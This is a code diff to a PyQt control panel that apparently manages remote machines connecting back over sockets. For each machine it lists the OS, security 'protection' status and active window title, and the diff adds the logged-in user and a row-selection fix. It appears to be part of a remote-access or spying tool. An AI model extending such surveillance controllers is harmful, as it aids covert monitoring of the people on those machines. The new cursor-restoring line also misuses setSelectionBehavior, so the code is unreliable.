@@ -41,12 +41,17 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
         self.index_of_socket = 1
         self.index_of_lock = 2
         self.index_of_os = 3
-        self.index_of_activeWindowTitle = 4
+        self.index_of_user = 4
+        self.index_of_activeWindowTitle = 5
         # initialize servers table columns width
         self.serversTable.setColumnWidth(self.index_of_ipAddress, 150)
         self.serversTable.setColumnWidth(self.index_of_socket, 60)
         self.serversTable.setColumnWidth(self.index_of_lock, 80)
         self.serversTable.setColumnWidth(self.index_of_os, 200)
+        self.serversTable.setColumnWidth(self.index_of_user, 150)
+        # fix cursor after table update
+        self.cur_server_cursor = 0
+        self.serversTable.clicked.connect(self.saveCursorAfterTableUpdate)
 
         # Triggers
         self.startListenButton.clicked.connect(self.startListen)
@@ -111,6 +116,7 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
                     self.socks[socketIndex]['ostype'] = info['ostype']
                     self.socks[socketIndex]['protection'] = info['protection']
                     self.socks[socketIndex]['os'] = info['os']
+                    self.socks[socketIndex]['user'] = info['user']
                     self.socks[socketIndex]['activewindowtitle'] = info['activewindowtitle']
 
                     self.updateServersTable()
@@ -121,6 +127,10 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
                     serversCheckThread.start()
                 except:
                     continue
+
+    # Save cursor after update
+    def saveCursorAfterTableUpdate(self):
+        self.cur_server_cursor = self.serversTable.currentRow()
 
     # Servers Live Update
     def checkServers(self):
@@ -133,6 +143,7 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
                     data = self.Receive(sock)
                     info = ast.literal_eval(data)
                     self.socks[i]['protection'] = info['protection']
+                    self.socks[i]['user'] = info['user']
                     self.socks[i]['activewindowtitle'] = info['activewindowtitle']
                 except socket.error:
                     del self.socks[i]
@@ -171,6 +182,10 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
             item.setIcon(QIcon(os.path.join(self.assets, self.osIcon(self.socks[obj]['ostype']))))
             self.serversTable.setItem(index, self.index_of_os, item)
 
+            # add server user
+            item = QTableWidgetItem(self.socks[obj]['user'])
+            self.serversTable.setItem(index, self.index_of_user, item)
+
             # add active windows title
             item = QTableWidgetItem(self.socks[obj]['activewindowtitle'])
             item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
@@ -178,6 +193,10 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
 
         # update servers online counter
         self.onlineStatus.setText(str(len(self.socks)))
+
+        # set cursor after table update
+        self.serversTable.setSelectionBehavior(self.cur_server_cursor)
+
 
     def osIcon(self, os):
         if os == "linux" or os == "linux2":
